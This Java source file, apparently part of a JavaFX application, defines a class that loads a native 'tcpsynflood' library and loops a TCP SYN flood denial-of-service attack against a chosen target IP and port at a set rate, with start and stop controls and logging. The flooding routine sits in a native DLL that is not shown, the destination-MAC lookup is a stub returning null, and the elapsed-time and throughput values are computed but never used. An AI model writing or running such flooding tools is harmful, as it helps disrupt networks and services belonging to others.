package com.yourpackage;

import javafx.scene.control.TextArea;
import javafx.application.Platform;
import java.util.logging.Logger;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.net.InetAddress;
import org.jnetpcap.*;
import org.jnetpcap.packet.*;
import org.jnetpcap.packet.format.*;
import org.jnetpcap.protocol.*;
import org.jnetpcap.protocol.network.*;
import org.jnetpcap.protocol.tcpip.*;

public class Jenkins {
    private static final Logger logger = Logger.getLogger(Jenkins.class.getName());
    private TextArea logArea;
    private volatile boolean stopAttack = false;
    private String sourceIp;
    private byte[] sourceMac;

    // Native method declaration
    static {
        System.loadLibrary("tcpsynflood"); // Ensure tcpsynflood.dll is in java.library.path
    }

    public native boolean nativeTcpSynFlood(
        String sourceIp,
        String sourceMac,
        String destIp,
        String destMac,
        int destPort,
        long bytesPerSecond
    );

    public void resetAttack() {
        stopAttack = false;
    }

    public void tcpSynFlood(String targetIp, int targetPort, long targetBytesPerSecond, Runnable updateChart) {
        // Implementation of tcpSynFlood method
        new Thread(() -> {
            long startTime = System.currentTimeMillis();
            while (!stopAttack) {
                // Perform the attack
                nativeTcpSynFlood(sourceIp, bytesToMacString(sourceMac), targetIp, "00-00-00-00-00-00", targetPort, targetBytesPerSecond);
                long currentTime = System.currentTimeMillis();
                double elapsedTimeSeconds = (currentTime - startTime) / 1000.0;
                double actualMbps = targetBytesPerSecond * 8.0 / 1_000_000.0; // Convert bytes/sec to Mbps
                Platform.runLater(() -> updateChart.run());
            }
        }).start();
    }

    public void stopAttack() {
        stopAttack = true;
    }

    public void setSourceIp(String sourceIp) {
        this.sourceIp = sourceIp;
    }

    public void setSourceMac(byte[] sourceMac) {
        this.sourceMac = sourceMac;
    }

    private String bytesToMacString(byte[] mac) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < mac.length; i++) {
            sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
        }
        return sb.toString();
    }

    // Method to log a message
    private void log(String message) {
        logger.info(message);
        if (logArea != null) {
            Platform.runLater(() -> {
                logArea.appendText(LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")) 
                    + " - " + message + "\n");
            });
        }
    }

    public String getMacAddress(String targetIp) {
        try {
            InetAddress targetAddress = InetAddress.getByName(targetIp);
            byte[] mac = getDestinationMacAddress(targetAddress);
            if (mac == null) {
                log("MAC address could not be retrieved.");
                return null;
            }
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < mac.length; i++) {
                sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
            }
            String macAddress = sb.toString();
            log("MAC address retrieved: " + macAddress);
            return macAddress;
        } catch (Exception e) {
            log("Error retrieving MAC address: " + e.getMessage());
            return null;
        }
    }

    // Assume getDestinationMacAddress is implemented elsewhere
    private byte[] getDestinationMacAddress(InetAddress targetAddress) {
        // Implementation goes here
        return null; // Placeholder
    }

    // Setter for logArea
    public void setLogArea(TextArea logArea) {
        this.logArea = logArea;
    }

    // Other methods...
}